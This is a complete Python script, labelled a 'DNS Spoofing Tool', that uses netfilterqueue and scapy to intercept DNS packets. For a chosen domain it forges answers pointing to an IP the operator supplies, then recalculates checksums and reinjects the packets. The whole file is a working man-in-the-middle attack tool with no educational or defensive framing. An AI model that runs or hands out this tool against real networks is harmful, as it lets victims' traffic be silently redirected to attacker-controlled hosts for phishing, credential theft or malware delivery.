#!/usr/bin/env python
import netfilterqueue
from scapy.layers.dns import DNSRR, DNSQR, DNS
from scapy.layers.inet import IP, UDP
import argparse


# Function to process packets and perform DNS spoofing
def process_packets(packet, spoof_domain, spoof_ip):
    try:
        scapy_packet = IP(packet.get_payload())
        if scapy_packet.haslayer(DNSQR):
            qname = scapy_packet[DNSQR].qname.decode()
            if spoof_domain in qname:
                print(f"[+] Spoofing {spoof_domain} to {spoof_ip}...")
                answer = DNSRR(rrname=qname, rdata=spoof_ip)
                scapy_packet[DNS].an = answer
                scapy_packet[DNS].ancount = 1
                del scapy_packet[IP].len
                del scapy_packet[IP].chksum
                del scapy_packet[UDP].len
                del scapy_packet[UDP].chksum
                packet.set_payload(bytes(scapy_packet))
        packet.accept()
    except Exception as e:
        print("[-] Error processing packet:", e)
        packet.accept()


# Function to parse command-line arguments
def get_arguments():
    parser = argparse.ArgumentParser(description="DNS Spoofing Tool")
    parser.add_argument("-d", "--domain", dest="spoof_domain", help="The domain to spoof (e.g., www.example.com)")
    parser.add_argument("-i", "--ip", dest="spoof_ip",
                        help="The IP address to which to spoof the domain (e.g., 10.0.2.26)")
    args = parser.parse_args()
    ip = args.spoof_ip
    domain = args.spoof_domain
    return ip, domain


if __name__ == "__main__":
    # Get spoofed domain and IP from command-line arguments
    spoof_ip, spoof_domain = get_arguments()

    try:
        # Create a netfilterqueue object and bind it to process_packets
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, lambda packet: process_packets(packet, spoof_domain, spoof_ip))

        # Start DNS spoofing
        print(f"[+] DNS Spoofing for {spoof_domain} started. Waiting for DNS queries...")
        queue.run()
    except KeyboardInterrupt:
        print("\n[x] DNS Spoofing stopped.")
